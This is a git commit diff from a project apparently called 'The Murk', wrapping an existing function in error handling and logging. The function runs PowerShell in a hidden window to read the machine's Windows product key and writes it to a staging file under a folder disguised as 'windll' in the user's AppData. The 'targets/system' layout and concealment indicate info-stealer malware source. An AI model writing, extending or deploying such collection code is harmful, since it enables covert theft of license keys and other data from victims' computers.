fda2aa57b8e3e71e69980a96d3b3b5b3016ef9fc
Nick Vinesmoke <darkdedpro@gmail.com>
2023-12-20 17:10:30 +0200

    fixed error with subprocess

--- The Murk/targets/system/productkey.py
+++ The Murk/targets/system/productkey.py
@@ -11,18 +11,23 @@
 #-----------------------------------------------------------------------------#
 from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
 from os import sep,environ
+from manager.logger import Log
 
 def ProductKey():
     pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
-    startupinfo = STARTUPINFO()
-    startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-    result = run(
-        ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
-        capture_output=True,
-        text=True,
-        startupinfo=startupinfo
-    )
-    output = result.stdout.strip()
+    try:
+        startupinfo = STARTUPINFO()
+        startupinfo.dwFlags |= STARTF_USESHOWWINDOW
+        result = run(
+            ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
+            capture_output=True,
+            text=True,
+            startupinfo=startupinfo
+        )
+        output = result.stdout.strip()
+    except Exception as e:
+        Log(f"ProductKey ---> {e}")
+        return
 
     if output:
         with open(pathtofile+"\\System\\productkey.txt", 'w', encoding='UTF-8') as f:
